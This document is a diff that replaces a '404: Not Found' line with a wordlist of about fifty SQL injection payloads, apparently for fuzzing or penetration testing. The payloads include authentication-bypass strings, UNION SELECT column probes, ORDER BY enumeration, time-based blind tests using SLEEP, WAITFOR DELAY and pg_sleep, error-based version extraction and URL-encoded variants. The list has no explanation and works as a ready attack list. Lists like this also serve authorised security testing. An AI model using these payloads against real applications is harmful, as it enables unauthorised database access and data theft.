@@ -1,1 +1,50 @@
-404: Not Found
+'
+"
+`
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1"#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+) OR 1=1--
+') OR ('1'='1
+')) OR (('1'='1
+") OR ("1"="1
+")) OR (("1"="1
+or 1=1
+or 1=1--
+or 1=1#
+admin' --
+admin' #
+admin'/*
+admin' OR '1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 10--
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)--
+1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
+'; WAITFOR DELAY '0:0:5'--
+1); WAITFOR DELAY '0:0:5'--
+' OR pg_sleep(5)--
+' AND 1=CONVERT(int,@@version)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+%27%20OR%201=1--
+%27%20OR%20%271%27=%271
+' OR 'x'='x
+0' OR '0'='0
